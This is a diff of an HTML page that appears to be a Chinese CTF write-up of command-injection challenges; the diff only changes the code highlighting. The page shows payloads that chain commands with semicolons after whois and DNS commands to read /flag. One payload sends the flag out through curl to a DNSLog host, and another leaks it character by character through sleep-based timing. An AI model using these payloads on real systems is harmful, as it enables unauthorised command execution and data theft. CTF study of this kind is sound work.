@@ -282,19 +282,19 @@
 
 <hr>
 <h3 id="CMD-1"><a href="#CMD-1" class="headerlink" title="CMD-1"></a>CMD-1</h3><p>直接执行命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>
 
 <h3 id="CMD-2"><a href="#CMD-2" class="headerlink" title="CMD-2"></a>CMD-2</h3><p>同1。</p>
 <h3 id="CMD-3"><a href="#CMD-3" class="headerlink" title="CMD-3"></a>CMD-3</h3><p>与whois命令拼接，截断后执行命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat /flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">;<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>
 
 <h3 id="CMD-4"><a href="#CMD-4" class="headerlink" title="CMD-4"></a>CMD-4</h3><p>同3。</p>
 <h3 id="CMD-5"><a href="#CMD-5" class="headerlink" title="CMD-5"></a>CMD-5</h3><p>与某种DNS解析命令拼接，存在两个输入参数，但只用其中一个就可以解体。</p>
 <p>由于命令结果不回显，需要通过延时或者外带的方式进行盲打，比如通过DNSLog外带：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;abb=`cat /flag | cut -c 6-21`;bbb=&quot;.lzth1m.dnslog.cn&quot;;curl $abb$bbb#</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">;<span class="hljs-attribute">abb</span>=`cat /flag | cut -c 6-21`;<span class="hljs-attribute">bbb</span>=<span class="hljs-string">&quot;.lzth1m.dnslog.cn&quot;</span>;curl <span class="hljs-variable">$abb</span><span class="hljs-variable">$bbb</span>#<br></code></pre></td></tr></table></figure>
 
 <p>比如延时：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;eval &#x27;if [ $(cat /flag|cut -c 1) = f ];then sleep 5; fi;&#x27;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">;<span class="hljs-built_in">eval</span> <span class="hljs-string">&#x27;if [ $(cat /flag|cut -c 1) = f ];then sleep 5; fi;&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
 <h3 id="CMD-6"><a href="#CMD-6" class="headerlink" title="CMD-6"></a>CMD-6</h3><p>同5。</p>
 <hr>
